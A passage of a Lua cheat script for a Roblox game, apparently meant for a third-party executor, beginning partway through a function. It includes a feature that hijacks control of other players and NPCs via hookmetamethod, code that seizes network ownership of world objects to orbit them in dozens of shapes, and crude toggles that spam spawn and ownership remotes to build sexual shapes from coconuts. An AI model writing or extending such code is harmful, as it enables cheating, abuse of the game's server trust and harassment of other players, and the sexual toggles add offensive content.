            CleanupAllConnections()
            DeactivateNoclipMode()
            MovePlayerToPosition(CFrame.new(TargetRootPart.Position + Vector3.new(5, 15, 5)))
            EnableCharacterQuery(TargetModel)
            VelocityController:Destroy()
            PlayerVelocityController:Destroy()

            game_Workspace.CurrentCamera.CameraSubject = PlayerHumanoidReference
            _G.ControllingCreature = nil
            PlayerRootPartReference.Velocity = Vector3.new()

            EndControlVisuals()
        end
    end
end
function ExecuteControlAction()
    ActiveCharacter = GetCurrentCharacter()

    if ActiveCharacter then
        CharacterHead = ActiveCharacter.Head
        ActiveCamera = game_Workspace.CurrentCamera
        CharacterHumanoid = ActiveCharacter:FindFirstChildOfClass('Humanoid')
        RaycastResult = game_Workspace:Raycast(CharacterHead.Position, ActiveCamera.CFrame.lookVector * 50, RaycastParameters)

        if RaycastResult and (CharacterHumanoid and CharacterHumanoid.Health > 0) then
            HitInstanceParent = RaycastResult.Instance.Parent

            if HitInstanceParent:FindFirstChildOfClass('Humanoid') then
                BeginControllingTarget(HitInstanceParent)
            end
        end
    end
end
function ExecuteControlToggle()
    if _G.ControllingCreature then
        _G.ControllingCreature = nil
    else
        ExecuteControlAction()
    end
end

CurrentPlayer.CharacterAdded:Connect(function(newCharacter)
    RaycastParameters.FilterDescendantsInstances = {newCharacter}
end)

local ControlToggle = ControlPanel:AddCheckbox('ControlCharactersToggle', {
    Text = 'Player + NPC Control',
    Default = false,
    Tooltip = 'Control the NPC/Player you are looking at.',
    Disabled = typeof(hookmetamethod) ~= 'function',
    DisabledTooltip = 'This feature is not available on your executor.',
})
local ControlKeybind = ControlToggle:AddKeyPicker('ControlKeybind', {
    Default = 'V',
    Text = 'Control Key',
    Mode = 'Toggle',
    Callback = function(isActive)
        if not ControlToggle.Value then
            return
        end

        ExecuteControlToggle()
    end,
})

ControlToggle:OnChanged(function(enabled) end)
ControlKeybind:OnChanged(function()
    print('Control keybind updated \u{2192}', ControlKeybind.Value)
end)

activeSparklers = {}
sparklerConfig = {
    Height = 5,
    Speed = 2,
    Radius = 15,
    CurrentShape = 'Planet',
}
shapeOptions = {
    'Planet',
    'Sphere',
    'Cylinder',
    'Double Ring',
    'Star',
    'Infinity',
    'Heart',
    'DNA Helix',
    'Triple Helix',
    'Tornado',
    'Galaxy Spiral',
    'Fibonacci Spiral',
    'Spring Coil',
    'Vortex Funnel',
    'Box',
    'Rounded Cube',
    'Torus',
    'Torus Knot',
    'M\u{f6}bius Strip',
    'Saturn',
    'Ice Cube',
}

function SetupPhysics(obj, list)
    for _, v in ipairs(list)do
        if v == obj then
            return
        end
    end

    local mainPart = obj:IsA('BasePart') and obj or obj.PrimaryPart or obj:FindFirstChildWhichIsA('BasePart', true)

    if not mainPart then
        return
    end

    pcall(function()
        if mainPart:CanSetNetworkOwnership() then
            mainPart:SetNetworkOwner(LocalPlayer)
        end
    end)

    mainPart.Anchored = false

    local bp = mainPart:FindFirstChild('ToyBodyPos') or Instance.new('BodyPosition', mainPart)

    bp.Name = 'ToyBodyPos'
    bp.MaxForce = Vector3.new(1e8, 1e8, 1e8)
    bp.P = 100000
    bp.D = 800

    local bg = mainPart:FindFirstChild('ToyBodyGyro') or Instance.new('BodyGyro', mainPart)

    bg.Name = 'ToyBodyGyro'
    bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
    bg.P = 50000

    for _, p in ipairs(obj:GetDescendants())do
        if p:IsA('BasePart') then
            p.CanCollide = false
        end
    end

    table.insert(list, obj)
end

local TAU = math.pi * 2
local sqrt = math.sqrt
local sin = math.sin
local cos = math.cos
local abs = math.abs
local sign = math.sign
local pow = function(b, e)
    return b >= 0 and b ^ e or -((-b) ^ e)
end
local clamp = math.clamp

function baseAngle(i, n, t, speed)
    return (i / n) * TAU + t * speed
end

Shapes = {}
Shapes.Planet = function(i, n, t, r, h, sp)
    local coreN = clamp(math.floor(n * 0.35), 8, 15)

    coreN = math.min(coreN, n)

    local ring1N = math.max(math.floor((n - coreN) / 2), 1)
    local spin = t * sp

    if i <= coreN then
        local phi = math.acos(1 - 2 * (i / coreN))
        local theta = i * math.pi * (3 - sqrt(5)) + spin
        local cr = r * 0.35

        return Vector3.new(cos(theta) * sin(phi) * cr, cos(phi) * cr + h, sin(theta) * sin(phi) * cr)
    elseif i <= coreN + ring1N then
        local idx = i - coreN
        local a = (idx / ring1N) * TAU + spin
        local rr = r * 0.9
        local tilt = math.rad(30)

        return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
    else
        local idx = i - (coreN + ring1N)
        local c = math.max(n - (coreN + ring1N), 1)
        local a = (idx / c) * TAU + t * sp * 0.5
        local rr = r * 1.3
        local tilt = math.rad(-40)

        return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
    end
end
Shapes.Sphere = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5)) + t * sp * 2

    return Vector3.new(cos(theta) * sin(phi) * r, cos(phi) * r + h, sin(theta) * sin(phi) * r)
end
Shapes.Cylinder = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local y = (i / n) * r * 1.5 - r * 0.75

    return Vector3.new(cos(a) * r, h + y, sin(a) * r)
end
Shapes['Double Ring'] = function(i, n, t, r, h, sp)
    local a = (i / (n / 2)) * TAU + t * sp

    if i % 2 == 0 then
        return Vector3.new(cos(a) * r, h, sin(a) * r)
    else
        return Vector3.new(0, h + cos(a) * r, sin(a) * r)
    end
end
Shapes.Star = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local rr = (i % 2 == 0) and r or r * 0.38

    return Vector3.new(cos(a) * rr, h + sin(t * sp * 1.5 + i * 0.3) * 1.5, sin(a) * rr)
end
Shapes.Infinity = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local d = 1 + sin(a) ^ 2

    return Vector3.new((r * cos(a)) / d, h + sin(t * sp + i * 0.2) * 1.2, (r * sin(a) * cos(a)) / d)
end
Shapes.Heart = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local pulse = 1 + 0.12 * sin(t * sp * 2)
    local scale = (r / 15) * pulse
    local x = 16 * sin(a) ^ 3
    local z = -(13 * cos(a) - 5 * cos(2 * a) - 2 * cos(3 * a) - cos(4 * a))

    return Vector3.new(x * scale, h + sin(t * sp * 2) * 0.5, z * scale)
end
Shapes['DNA Helix'] = function(i, n, t, r, h, sp)
    local y = (i / n) * r * 2 - r
    local a = baseAngle(i, n, t, sp) + y * 0.5
    local side = (i % 2 == 0) and 1 or -1

    return Vector3.new(cos(a) * r * side, h + y, sin(a) * r * side)
end
Shapes['Triple Helix'] = function(i, n, t, r, h, sp)
    local y = (i / n) * r * 2 - r
    local a = baseAngle(i, n, t, sp) + y * 0.5
    local phase = (i % 3) * (TAU / 3)

    return Vector3.new(cos(a + phase) * r, h + y, sin(a + phase) * r)
end
Shapes.Tornado = function(i, n, t, r, h, sp)
    local y = (i / n) * r * 2 - r
    local rr = ((y + r) / (r * 2)) * r + 2
    local a = baseAngle(i, n, t, sp) + y * 0.5

    return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
end
Shapes['Galaxy Spiral'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * 12 + t * sp

    return Vector3.new(cos(a) * r * (frac ^ 1.5), h + sin(t * sp * 2 + frac * 10), sin(a) * r * (frac ^ 1.5))
end
Shapes['Fibonacci Spiral'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local angle = frac * TAU * 6.18 + t * sp
    local dist = frac * r
    local wave = sin(t * sp + frac * TAU) * 2

    return Vector3.new(cos(angle) * dist, h + wave, sin(angle) * dist)
end
Shapes['Spring Coil'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU * 5 + t * sp
    local y = frac * r * 2 - r

    return Vector3.new(cos(a) * r * 0.5, h + y, sin(a) * r * 0.5)
end
Shapes['Vortex Funnel'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU * 4 + t * sp
    local rr = frac * r
    local y = (1 - frac) * r * 1.5

    return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
end
Shapes.Seashell = function(i, n, t, r, h, sp)
    local frac = i / n
    local u = frac * TAU * 3 + t * sp
    local v = frac * TAU
    local growth = math.exp(0.15 * u)
    local x = growth * cos(u) * (1 + cos(v)) * r * 0.15
    local y = growth * sin(u) * (1 + cos(v)) * r * 0.15
    local z = growth * sin(v) * r * 0.15

    return Vector3.new(x, h + y, z)
end
Shapes.Box = function(i, n, t, r, h, sp)
    local face = i % 6
    local a = baseAngle(i, n, t, sp)
    local wb = sin(t * sp + i) * 0.3
    local s = r
    local edges = {
        Vector3.new(s, sin(a) * s, cos(a) * s),
        Vector3.new(-s, sin(a) * s, cos(a) * s),
        Vector3.new(sin(a) * s, s, cos(a) * s),
        Vector3.new(sin(a) * s, -s, cos(a) * s),
        Vector3.new(sin(a) * s, cos(a) * s, s),
        Vector3.new(sin(a) * s, cos(a) * s, -s),
    }
    local v = edges[face + 1]

    return Vector3.new(v.X, v.Y + h + wb, v.Z)
end
Shapes['Rounded Cube'] = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local x = pow(cos(a) * r, 0.85)
    local y = pow(sin(a * 1.3) * r * 0.6, 0.85)
    local z = pow(cos(a * 0.7) * r, 0.85)

    return Vector3.new(x, y + h, z)
end
Shapes.Torus = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local b = baseAngle(i, n, t * 3, sp)
    local R = r
    local rt = r * 0.35

    return Vector3.new((R + rt * cos(b)) * cos(a), rt * sin(b) + h, (R + rt * cos(b)) * sin(a))
end
Shapes['Torus Knot'] = function(i, n, t, r, h, sp)
    local p, q = 2, 3
    local a = baseAngle(i, n, t, sp)
    local phi = a * q
    local R = r * (1 + 0.35 * cos(p * a))

    return Vector3.new(R * cos(phi), r * 0.35 * sin(p * a) + h, R * sin(phi))
end
Shapes['M\u{f6}bius Strip'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local u = frac * TAU + t * sp
    local v = (i % 2 == 0) and 0.5 or -0.5
    local w = r * 0.35

    return Vector3.new((r + w * v * cos(u / 2)) * cos(u), w * v * sin(u / 2) + h, (r + w * v * cos(u / 2)) * sin(u))
end
Shapes.Saturn = function(i, n, t, r, h, sp)
    local spin = t * sp

    if i <= n * 0.6 then
        local phi = math.acos(1 - 2 * (i / (n * 0.6)))
        local theta = i * math.pi * (3 - sqrt(5)) + spin
        local pr = r * 0.45

        return Vector3.new(cos(theta) * sin(phi) * pr, cos(phi) * pr + h, sin(theta) * sin(phi) * pr)
    else
        local idx = i - n * 0.6
        local c = n - n * 0.6
        local a = (idx / c) * TAU + spin
        local rr = r * 1.2

        return Vector3.new(cos(a) * rr, sin(a) * rr * sin(math.rad(25)) + h, sin(a) * rr * cos(math.rad(25)))
    end
end
Shapes['Ice Cube'] = function(i, n, t, r, h, sp)
    local face = i % 6
    local frac = (i % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
    local a = frac * TAU
    local s = r * 0.8
    local crack = sin(t * sp * 2 + i * 0.5) * 0.4
    local pts = {
        Vector3.new(s + crack, cos(a) * s, sin(a) * s),
        Vector3.new(-s - crack, cos(a) * s, sin(a) * s),
        Vector3.new(cos(a) * s, s + crack, sin(a) * s),
        Vector3.new(cos(a) * s, -s - crack, sin(a) * s),
        Vector3.new(cos(a) * s, sin(a) * s, s + crack),
        Vector3.new(cos(a) * s, sin(a) * s, -s - crack),
    }
    local v = pts[face + 1]

    return Vector3.new(v.X, v.Y + h, v.Z)
end
Shapes['Black Hole'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU * 3 + t * sp
    local dist = r * (1 - frac * 0.7)
    local suck = sin(t * sp * 2) * 0.5

    return Vector3.new(cos(a) * dist, h + suck * frac * 3, sin(a) * dist)
end
Shapes['Hyper Sphere'] = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5)) + t * sp
    local pulse = r + sin(t * sp + i * 0.3) * r * 0.25

    return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse + h, sin(theta) * sin(phi) * pulse)
end
Shapes['Orbital Rings'] = function(i, n, t, r, h, sp)
    local ring = i % 3
    local a = baseAngle(i, n, t, sp)
    local tilts = {
        math.rad(0),
        math.rad(60),
        math.rad(-60),
    }
    local tilt = tilts[ring + 1]

    return Vector3.new(cos(a) * r, sin(a) * r * sin(tilt) + h, sin(a) * r * cos(tilt))
end
Shapes['Lightning Tornado'] = function(i, n, t, r, h, sp)
    local y = (i / n) * r * 2 - r
    local rr = ((y + r) / (r * 2)) * r + 2
    local bolt = sin(i * 7.3 + t * sp * 5) * 3
    local a = baseAngle(i, n, t, sp) + y * 0.5

    return Vector3.new(cos(a) * rr + bolt, h + y, sin(a) * rr + bolt)
end
Shapes['Plasma Cage'] = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5))
    local arc = sin(t * sp * 2 + phi * 6) * r * 0.2
    local rr = r + arc

    return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h, sin(theta) * sin(phi) * rr)
end
Shapes.Wormhole = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU + t * sp
    local y = (frac - 0.5) * r * 3
    local neck = r * (1 - math.exp(-((y / (r * 0.8)) ^ 2))) + 0.5

    return Vector3.new(cos(a) * neck, h + y, sin(a) * neck)
end
Shapes['Quantum Lattice'] = function(i, n, t, r, h, sp)
    local grid = math.ceil(n ^ (0.3333333333333333))
    local gx = i % grid
    local gy = math.floor(i / grid) % grid
    local gz = math.floor(i / (grid * grid)) % grid
    local scale = r * 2 / grid
    local jitter = sin(t * sp + i * 1.7) * 0.3

    return Vector3.new((gx - grid / 2) * scale + jitter, (gy - grid / 2) * scale + h, (gz - grid / 2) * scale + jitter)
end
Shapes['Neutron Burst'] = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5))
    local burst = r * abs(sin(t * sp + i * 0.4))

    return Vector3.new(cos(theta) * sin(phi) * burst, cos(phi) * burst + h, sin(theta) * sin(phi) * burst)
end
Shapes['Arc Discharge'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU
    local arc = sin(frac * math.pi) * r
    local zap = sin(t * sp * 8 + i * 2.1) * r * 0.15

    return Vector3.new(cos(a) * r + zap, h + arc + zap, sin(a) * r + zap)
end
Shapes['Event Horizon'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local a = frac * TAU * 5 + t * sp
    local dist = r * (0.2 + 0.8 * abs(sin(frac * math.pi)))
    local warp = sin(t * sp * 3 + frac * TAU) * r * 0.1

    return Vector3.new(cos(a) * dist, h + warp, sin(a) * dist)
end
Shapes.Butterfly = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp * 0.5)
    local ex = math.exp(cos(a)) - 2 * cos(4 * a) - sin(a / 12) ^ 5
    local rr = ex * r * 0.4

    return Vector3.new(cos(a) * rr, h + sin(t * sp + i * 0.1) * 1.5, sin(a) * rr)
end
Shapes['Rose Petal'] = function(i, n, t, r, h, sp)
    local k = 5
    local a = baseAngle(i, n, t, sp * 0.3)
    local rr = r * cos(k * a)

    return Vector3.new(cos(a) * rr, h + sin(t * sp + i * 0.2) * 2, sin(a) * rr)
end
Shapes.Snowflake = function(i, n, t, r, h, sp)
    local arm = i % 6
    local frac = (i % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
    local baseA = arm * (TAU / 6) + t * sp * 0.2
    local dist = frac * r
    local branch = sin(frac * math.pi * 4) * r * 0.2

    return Vector3.new(cos(baseA) * dist + cos(baseA + math.pi / 2) * branch, h + cos(t * sp) * 0.5, sin(baseA) * dist + sin(baseA + math.pi / 2) * branch)
end
Shapes['Crystal Bloom'] = function(i, n, t, r, h, sp)
    local petals = 8
    local arm = i % petals
    local frac = (i % math.max(math.floor(n / petals), 1)) / math.max(math.floor(n / petals), 1)
    local baseA = arm * (TAU / petals) + t * sp * 0.3
    local dist = frac * r
    local lift = sin(frac * math.pi) * r * 0.5

    return Vector3.new(cos(baseA) * dist, h + lift, sin(baseA) * dist)
end
Shapes['Vine Wrap'] = function(i, n, t, r, h, sp)
    local frac = i / n
    local turns = 4
    local a = frac * TAU * turns + t * sp
    local y = frac * r * 2 - r
    local bulge = 1 + 0.3 * sin(frac * TAU * turns * 2)
    local rr = r * 0.5 * bulge

    return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
end
Shapes['Flower Bloom'] = function(i, n, t, r, h, sp)
    local petals = 6
    local a = baseAngle(i, n, t, sp * 0.4)
    local rr = r * abs(cos(petals * a * 0.5))
    local bloom = 1 + 0.2 * sin(t * sp * 2)

    return Vector3.new(cos(a) * rr * bloom, h + sin(t * sp + a) * 1.5, sin(a) * rr * bloom)
end
Shapes.Jellyfish = function(i, n, t, r, h, sp)
    local bell = math.floor(n * 0.4)

    if i <= bell then
        local phi = (i / bell) * math.pi * 0.5
        local theta = baseAngle(i, bell, t, sp)
        local pulse = r * (1 + 0.2 * sin(t * sp * 3))

        return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse * 0.5 + h, sin(theta) * sin(phi) * pulse)
    else
        local idx = i - bell
        local c = n - bell
        local a = (idx / c) * TAU + t * sp
        local drop = (idx / c) * r * 1.5
        local wave = sin(t * sp * 4 + a * 3) * r * 0.15

        return Vector3.new(cos(a) * r * 0.2 + wave, h - drop, sin(a) * r * 0.2 + wave)
    end
end
Shapes['Coral Reef'] = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp * 0.2)
    local frac = i / n
    local y = sin(frac * TAU * 3 + t * sp) * r * 0.8
    local rr = r * (0.5 + 0.5 * sin(frac * TAU * 5))
    local sway = sin(t * sp + frac * 12) * r * 0.1

    return Vector3.new(cos(a) * rr + sway, h + y, sin(a) * rr + sway)
end
Shapes['Volcano Burst'] = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local burst = abs(sin(t * sp + i)) * r * 2

    return Vector3.new(cos(a) * burst, h + burst, sin(a) * burst)
end
Shapes['Cosmic Explosion'] = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local wave = abs(sin(t * sp * 2 - i * 0.1))

    return Vector3.new(cos(a) * r * wave * 3, h + wave * 5, sin(a) * r * wave * 3)
end
Shapes.Supernova = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5)) + t * sp
    local blast = r * (1 + sin(t * sp * 0.5) * 0.5)
    local eject = sin(phi * 3 + t * sp * 4) * r * 0.3

    return Vector3.new(cos(theta) * sin(phi) * (blast + eject), cos(phi) * (blast + eject) + h, sin(theta) * sin(phi) * (blast + eject))
end
Shapes['Firework Pop'] = function(i, n, t, r, h, sp)
    local phi = math.acos(1 - 2 * (i / n))
    local theta = i * math.pi * (3 - sqrt(5))
    local trail = abs(sin(t * sp * 3 + i * 0.7))
    local rr = r * trail
    local sparkle = sin(t * sp * 10 + i) * 0.8

    return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h + sparkle, sin(theta) * sin(phi) * rr)
end
Shapes.Shockwave = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local ring = sin(t * sp * 3) * r
    local y = cos(t * sp * 2 + i * 0.2) * r * 0.3

    return Vector3.new(cos(a) * ring, h + y, sin(a) * ring)
end
Shapes.Lissajous = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local p, q = 3, 2
    local d = math.pi / 2

    return Vector3.new(r * sin(p * a + d), h + r * 0.4 * sin(t * sp + i * 0.1), r * sin(q * a))
end
Shapes.Hypotrochoid = function(i, n, t, r, h, sp)
    local R, rd, d = r, r * 0.4, r * 0.7
    local a = baseAngle(i, n, t, sp)
    local x = (R - rd) * cos(a) + d * cos((R - rd) / rd * a)
    local z = (R - rd) * sin(a) - d * sin((R - rd) / rd * a)

    return Vector3.new(x * 0.7, h + sin(t * sp + i * 0.2) * 2, z * 0.7)
end
Shapes.Epitrochoid = function(i, n, t, r, h, sp)
    local R, rd, d = r * 0.6, r * 0.35, r * 0.5
    local a = baseAngle(i, n, t, sp)
    local x = (R + rd) * cos(a) - d * cos((R + rd) / rd * a)
    local z = (R + rd) * sin(a) - d * sin((R + rd) / rd * a)

    return Vector3.new(x * 0.7, h + sin(t * sp + i * 0.15) * 2, z * 0.7)
end
Shapes.Trefoil = function(i, n, t, r, h, sp)
    local a = baseAngle(i, n, t, sp)
    local x = sin(a) + 2 * sin(2 * a)
    local y = cos(a) - 2 * cos(2 * a)
    local z = -sin(3 * a)
    local sc = r / 3

    return Vector3.new(x * sc, y * sc + h, z * sc)
end
Shapes['Klein Bottle Slice'] = function(i, n, t, r, h, sp)
    local u = baseAngle(i, n, t, sp)
    local v = baseAngle(i, math.max(n, 1), t * 2, sp)
    local a = r * 0.3
    local x = (a + a * cos(v)) * cos(u)
    local y = (a + a * cos(v)) * sin(u)
    local z = a * sin(v) + sin(t * sp + i * 0.2) * 2

    return Vector3.new(x, y + h, z)
end
Shapes.Harmonograph = function(i, n, t, r, h, sp)
    local frac = i / n
    local decay = math.exp(-frac * 0.5)
    local f1, f2, f3, f4 = 3, 2, 3, 2
    local p1, p2 = math.pi / 4, math.pi / 6
    local a = frac * TAU * 8 + t * sp
    local x = r * decay * (sin(f1 * a + p1) + sin(f2 * a))
    local z = r * decay * (sin(f3 * a + p2) + sin(f4 * a))

    return Vector3.new(x * 0.5, h + sin(t * sp + frac * 12) * 1.5, z * 0.5)
end

function GetShapeOffset(index, total, t, cfg)
    local fn = Shapes[cfg.CurrentShape]

    if fn then
        return fn(index, total, t, cfg.Radius, cfg.Height, cfg.Speed)
    end

    local a = (index / total) * TAU + t * cfg.Speed

    return Vector3.new(cos(a) * cfg.Radius, cfg.Height, sin(a) * cfg.Radius)
end

local SparklerGroup = Tabs.Grab:AddLeftGroupbox('Sparkler Auras', 'flame')

SparklerGroup:AddButton('Synchronize All Sparklers', function()
    for _, obj in ipairs(workspace:GetDescendants())do
        if obj.Name:find('FireworkSparkler') then
            SetupPhysics(obj, activeSparklers)
        end
    end
end)
SparklerGroup:AddButton('Unsynchronize All Sparklers', function()
    activeSparklers = {}
end)
SparklerGroup:AddSlider('HeightSlider', {
    Text = 'Height Offset',
    Default = 5,
    Min = -20,
    Max = 150,
    Rounding = 0,
})
Options.HeightSlider:OnChanged(function()
    sparklerConfig.Height = Options.HeightSlider.Value
end)
SparklerGroup:AddSlider('RadiusSlider', {
    Text = 'Shape Radius',
    Default = 15,
    Min = 2,
    Max = 100,
    Rounding = 0,
})
Options.RadiusSlider:OnChanged(function()
    sparklerConfig.Radius = Options.RadiusSlider.Value
end)
SparklerGroup:AddSlider('SpeedSlider', {
    Text = 'Rotation Speed',
    Default = 2,
    Min = 0,
    Max = 20,
    Rounding = 1,
})
Options.SpeedSlider:OnChanged(function()
    sparklerConfig.Speed = Options.SpeedSlider.Value
end)
SparklerGroup:AddDropdown('ShapeDropdown', {
    Values = shapeOptions,
    Default = 'Planet',
    Multi = false,
    Text = 'Select Shape',
})
Options.ShapeDropdown:OnChanged(function()
    sparklerConfig.CurrentShape = Options.ShapeDropdown.Value
end)
RunService.RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    local targetRoot = char and char:FindFirstChild('HumanoidRootPart')

    if not targetRoot then
        return
    end

    local t = tick()
    local prediction = targetRoot.AssemblyLinearVelocity * 0.12
    local rot = targetRoot.CFrame.Rotation

    for i = #activeSparklers, 1, -1 do
        local obj = activeSparklers[i]

        if obj and obj.Parent then
            local main = obj:IsA('BasePart') and obj or obj.PrimaryPart
            local bp = main and main:FindFirstChild('ToyBodyPos')
            local bg = main and main:FindFirstChild('ToyBodyGyro')

            if bp and bg then
                local offset = GetShapeOffset(i, #activeSparklers, t, sparklerConfig)

                bp.Position = targetRoot.Position + prediction + (rot * offset)
                bg.CFrame = CFrame.new(main.Position, targetRoot.Position + prediction)
            end
        else
            table.remove(activeSparklers, i)
        end
    end
end)
SparklerGroup:AddDivider()
SparklerGroup:AddCheckbox('CoconutOrbit', {
    Text = 'Coconut Penis',
    Tooltip = 'Makes a dick out of coconuts',
    Default = false,
})
Toggles.CoconutOrbit:OnChanged(function(Value)
    CoconutEnabled = Value

    if not Value then
        return
    end

    task.spawn(function()
        local Me = game:GetService('Players').LocalPlayer
        local ReplicatedStorage = game:GetService('ReplicatedStorage')
        local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
        local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
        local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
        local Offsets = {
            [1] = CFrame.new(-0.45, -1.2, -0.7),
            [2] = CFrame.new(0.45, -1.2, -0.7),
            [3] = CFrame.new(0, -1, 0.8),
        }
        local Coconuts = {}

        while CoconutEnabled do
            local Character = Me.Character
            local Root = Character and Character:FindFirstChild('HumanoidRootPart')

            if not Root then
                task.wait(0.1)

                continue
            end

            local Folder = workspace:FindFirstChild(Me.Name .. 'SpawnedInToys')

            if not Folder then
                task.wait(0.1)

                continue
            end

            local Length = Options.CoconutAmount.Value
            local Damping = Options.CoconutDamping.Value

            table.clear(Coconuts)

            for _, Toy in ipairs(Folder:GetChildren())do
                if Toy.Name == 'FoodCoconut' then
                    table.insert(Coconuts, Toy)
                end
            end

            if #Coconuts < (Length + 2) then
                task.spawn(function()
                    SpawnToy:InvokeServer('FoodCoconut', Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                end)
            end

            for i, Coconut in ipairs(Coconuts)do
                local Part = Coconut:FindFirstChild('SoundPart')
                local HoldPart = Coconut:FindFirstChild('HoldPart')
                local Rigid = HoldPart and HoldPart:FindFirstChild('RigidConstraint')
                local PartOwner = Part and Part:FindFirstChild('PartOwner')

                if Part and HoldPart and Rigid then
                    if PartOwner and PartOwner.Value == Me.Name then
                        if i <= 2 then
                            Part.CFrame = Root.CFrame * Offsets[i] * CFrame.new(Root.Velocity / Damping)
                        else
                            Part.CFrame = Root.CFrame * Offsets[3] * CFrame.new(Root.Velocity / Damping) * CFrame.new(0, 0, Offsets[3].Z - (i + 0.2))
                        end

                        Part.Velocity = Vector3.zero
                    else
                        SetNetworkOwner:FireServer(Part, Part.CFrame)
                    end
                    if Rigid.Attachment1 then
                        DestroyToy:FireServer(Coconut)
                    end

                    for _, PartObj in ipairs(Coconut:GetChildren())do
                        if PartObj:IsA('BasePart') then
                            PartObj.CanCollide = false
                            PartObj.CanQuery = false

                            if PartObj.Transparency ~= 1 then
                                PartObj.Transparency = 0
                            end
                        end
                    end
                end
            end

            task.wait(0.01)
        end
    end)
end)
SparklerGroup:AddDivider()
SparklerGroup:AddCheckbox('CoconutBodyParts', {
    Text = "Coconut boob's and ass",
    Tooltip = 'Places coconuts on your chest and ass (making boobs and ass sob)',
    Default = false,
})
Toggles.CoconutBodyParts:OnChanged(function(Value)
    CoconutBodyEnabled = Value

    if not Value then
        return
    end

    task.spawn(function()
        local Me = game:GetService('Players').LocalPlayer
        local ReplicatedStorage = game:GetService('ReplicatedStorage')
        local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
        local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
        local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
        local Coconuts = {}

        while CoconutBodyEnabled do
            local Character = Me.Character
            local Root = Character and Character:FindFirstChild('HumanoidRootPart')

            if not Root then
                task.wait(0.1)

                continue
            end

            local Folder = workspace:FindFirstChild(Me.Name .. 'SpawnedInToys')

            if not Folder then
                task.wait(0.1)

                continue
            end

            table.clear(Coconuts)

            for _, Toy in ipairs(Folder:GetChildren())do
                if Toy.Name == 'FoodCoconut' then
                    table.insert(Coconuts, Toy)
                end
            end

            if #Coconuts < 4 then
                for _ = 1, 4 - #Coconuts do
                    task.spawn(function()
                        SpawnToy:InvokeServer('FoodCoconut', Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                    end)
                end
            end

            for i = 1, math.min(4, #Coconuts)do
                local Coconut = Coconuts[i]
                local Part = Coconut:FindFirstChild('SoundPart')
                local HoldPart = Coconut:FindFirstChild('HoldPart')
                local Rigid = HoldPart and HoldPart:FindFirstChild('RigidConstraint')
                local PartOwner = Part and Part:FindFirstChild('PartOwner')

                if Part and HoldPart and Rigid then
                    if PartOwner and PartOwner.Value == Me.Name then
                        local TargetCF

                        if i == 1 then
                            TargetCF = Root.CFrame * CFrame.new(-0.4, 0.3, -0.55)
                        elseif i == 2 then
                            TargetCF = Root.CFrame * CFrame.new(0.4, 0.3, -0.55)
                        elseif i == 3 then
                            TargetCF = Root.CFrame * CFrame.new(-0.35, -1.1, 0.45)
                        else
                            TargetCF = Root.CFrame * CFrame.new(0.35, -1.1, 0.45)
                        end

                        Part.CFrame = TargetCF
                        Part.Velocity = Vector3.zero
                    else
                        SetNetworkOwner:FireServer(Part, Part.CFrame)
                    end
                    if Rigid.Attachment1 then
                        DestroyToy:FireServer(Coconut)
                    end

                    for _, PartObj in ipairs(Coconut:GetChildren())do
                        if PartObj:IsA('BasePart') then
                            PartObj.CanCollide = false
                            PartObj.CanQuery = false

                            if PartObj.Transparency ~= 1 then
                                PartObj.Transparency = 0
                            end
                        end
                    end
                end
            end

            task.wait(0.01)
        end
